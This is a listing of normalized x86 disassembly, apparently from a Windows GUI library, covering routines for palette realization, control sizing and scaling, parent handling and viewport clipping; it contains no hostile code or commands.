je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_439388
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_404260
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_4393ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_439cc8
sub_43940c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_439cb4
sub_43942c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43944c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419854
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ca54
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43a3fc
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_438f6c
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43b2b4
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_439524
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_403490
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_459064
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403478
push edi
xor ecx ecx
mov edx 0xb039
call sub_43b4f4
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_439cec
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403300
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403104
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403104
mov eax [ edi + 0x68 ]
call sub_403104
mov eax [ edi + 0x64 ]
call sub_408750
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4198a0
test bl bl
jle r-xdata
sub_4395f0
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_439618
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403300
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4396a0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_4399a0
sub_4396c0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403104
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43c310
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403300
mov edx ebx
mov eax edi
call sub_419924
mov eax ebx
mov si 0xffd9
call sub_403300
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_439788
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419cb4
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43b4f4
sub_43981c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419b70
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43a304
jmp r-xdata
xor edx edx
mov eax esi
call sub_4396c0
sub_439860
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403300
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_4396a0
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403300
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_439908
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43ba84
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a794
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4399a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43b4f4
mov eax ebx
mov si 0xffd0
call sub_403300
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403300
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_4399a0
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_439abc
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_439ae0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_439b08
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_439b2c
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_439b50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_439c4b
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403300
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439c52
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413eb0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403300
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403300
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413c10
sub_439c5c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a794
mov edx edi
mov eax ebx
call sub_439d0c
mov edx edi
mov eax ebx
call sub_43b598
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_439cc8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403ea8
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_439d0c
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_439d68
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_439d94
mov edx eax
mov ecx esp
mov eax esi
call sub_412910
mov edx esp
mov eax ebx
call sub_43a1d8
pop ecx
pop edx
pop esi
pop ebx
retn
sub_439dac
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_439d50
mov ecx esp
mov edx esi
call sub_412910
mov edx esp
mov eax ebx
call sub_43a1d8
pop ecx
pop edx
pop esi
pop ebx
retn
sub_439dd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_439e55
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439e5c
lea eax [ ebp - 0xc ]
call sub_403e54
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059b8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b55c
call sub_403890
sub_439e64
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_439e90
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_439ebc
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_4555b8
sub_439eec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43b4f4
sub_439f68
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41ceac
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41cec8
sub_43a134
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43a1ca
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_419dac
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43a34c
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_404260
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a1d1
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43a37c
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43a1d8
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43a220
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
jne r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
test esi esi
je r-xdata
mov edx ebx
call sub_43d7a0
mov edx ebx
mov eax esi
call sub_43d6cc
mov eax ebx
call sub_4399a0
sub_43a26c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
cmp bl [ edi + 0x57 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
mov si 0xffcd
call sub_403300
mov [ edi + 0x57 ] bl
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb00b
mov eax edi
call sub_43b4f4
mov eax edi
mov si 0xffd0
call sub_403300
sub_43a304
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x7c ] esi
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_44e534
mov edx ebx
mov eax esi
call sub_419924
sub_43a328
push ebx
mov ebx eax
push edx
xor ecx ecx
mov eax ebx
mov edx 0xc
call sub_43b4f4
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax ebx
call sub_43b4f4
pop ebx
retn
sub_43a34c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43a2c0
mov ebx eax
mov eax edi
mov ecx ebx
xor edx edx
call sub_403f44
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ ebx + 0x1 ]
mov edx [ edi ]
mov eax esi
call sub_43a2d0
sub_43a37c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a3d1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404260
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a3d8
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
mov eax esi
call sub_404314
mov edx eax
mov eax ebx
call sub_43a328
sub_43a3fc
push ebx
mov ebx eax
mov [ ebx + 0x59 ] 0x0
mov [ ebx + 0x56 ] 0x0
mov eax [ ebx + 0x68 ]
call sub_41ce08
cmp eax [ ebx + 0x84 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax ebx
call sub_43b4f4
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41ce08
mov [ ebx + 0x84 ] eax
sub_43a584
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43a574
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43751c
mov eax esi
call sub_43751c
jmp r-xdata
sub_43a5bc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_413dc8
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413c5c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_413de8
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a794
mov eax ebx
call sub_451508
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403300
sub_43a63c
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_43a5bc
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_43a5bc
jmp r-xdata
sub_43a660
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_43a6f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
